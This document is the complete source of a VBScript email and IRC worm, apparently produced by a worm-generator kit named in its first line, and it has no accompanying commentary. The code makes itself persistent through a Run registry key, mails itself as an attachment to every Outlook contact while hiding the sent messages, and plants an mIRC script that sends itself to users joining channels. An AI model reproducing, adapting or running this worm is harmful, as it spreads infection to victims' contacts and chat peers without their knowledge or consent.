'Worm Created whit [K]Alamar's Vbs Worms Creator 0.1
On Error Resume Next
Set ylwdkbjcerl = CreateObject("WScript.Shell")
set pmhrmipullf=createobject("scripting.filesystemobject")
pmhrmipullf.copyfile wscript.scriptfullname,pmhrmipullf.GetSpecialFolder(0)& "\Worm.vbs"
ylwdkbjcerl.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SysBoot","wscript.exe "&pmhrmipullf.GetSpecialFolder(0)& "\Worm.vbs %"
if ylwdkbjcerl.regread ("HKCU\software\Worm\mailed") <> "1" then
khqpalxayeg()
end if
if ylwdkbjcerl.regread ("HKCU\software\Worm\mirqued") <> "1" then
nyzdigucmwf()
end if
Function khqpalxayeg()
On Error Resume Next
Set cxnrsrtmimb = CreateObject("Outlook.Application")
If cxnrsrtmimb= "Outlook"Then
Set ihprtobjfxo=cxnrsrtmimb.GetNameSpace("MAPI")
For Each pzoqxcmtngu In ihprtobjfxo.AddressLists
If pzoqxcmtngu.AddressEntries.Count <> 0 Then
For fesjslnansp= 1 To pzoqxcmtngu.AddressEntries.Count
Set yxitgcafovg = pzoqxcmtngu.AddressEntries(fesjslnansp)
Set afqodeuehlf = cxnrsrtmimb.CreateItem(0)
afqodeuehlf.To = yxitgcafovg.Address
afqodeuehlf.Subject = "Here you have, ;o)"
afqodeuehlf.Body = "Hi:" & vbcrlf & "Check This!" & vbcrlf & ""
afqodeuehlf.Attachments.Add pmhrmipullf.GetSpecialFolder(0)& "\Worm.vbs"
afqodeuehlf.DeleteAfterSubmit = True
If afqodeuehlf.To <> "" Then
afqodeuehlf.Send
End If
Next
End If
Next
ylwdkbjcerl.regwrite "HKCU\software\Worm\mailed", "1"
end if
End Function
Function nyzdigucmwf
On Error Resume Next
if pmhrmipullf.fileexists("c:\mirc\mirc.ini") then MircLoc="c:\mirc"
if pmhrmipullf.fileexists("c:\mirc32\mirc.ini") then MircLoc="c:\mirc"
Programfilesdir=ylwdkbjcerl.regread("HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\ProgramFilesDir")
if pmhrmipullf.fileexists(Programfilesdir & "\mirc.ini") then MircLoc=Programfilesdir & "\mirc"
set vaazcnrujqq = pmhrmipullf.CreateTextFile(MircLoc & "\script.ini", True)
vaazcnrujqq.writeline "n0=on 1:JOIN:#:{"
vaazcnrujqq.writeline "n1=  /if ( $nick == $me ) { halt }"
vaazcnrujqq.writeline "n2=  /.dcc send $nick C:\WINDOWS\Worm.vbs"
vaazcnrujqq.writeline "n3=}"
vaazcnrujqq.close
ylwdkbjcerl.regwrite "HKCU\software\Worm\Mirqued", "1"
end function
